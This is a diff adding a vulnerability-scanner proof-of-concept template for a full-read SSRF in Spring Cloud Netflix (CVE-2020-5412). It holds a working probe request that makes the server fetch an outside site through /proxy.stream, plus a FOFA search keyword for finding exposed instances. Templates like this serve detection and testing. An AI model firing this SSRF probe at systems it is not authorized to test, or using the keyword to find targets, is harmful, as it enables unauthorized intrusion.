@@ -1,0 +1,17 @@
+name: poc-yaml-Full-read-SSRF-in-Spring-Cloud-Netflix
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /proxy.stream?origin=http://www.baidu.com/?
+        expression: response.status == 200 && response.body.bcontains(bytes("baidu.com")) && response.body.bcontains(b"bdstatic.com")
+expression: r0()
+detail:
+    author: cysec
+    links:
+        - http://cysec.com
+    fofakeyword: app="Spring-Cloud-Netflix"
+    vulninfo: CVE-2020-5412
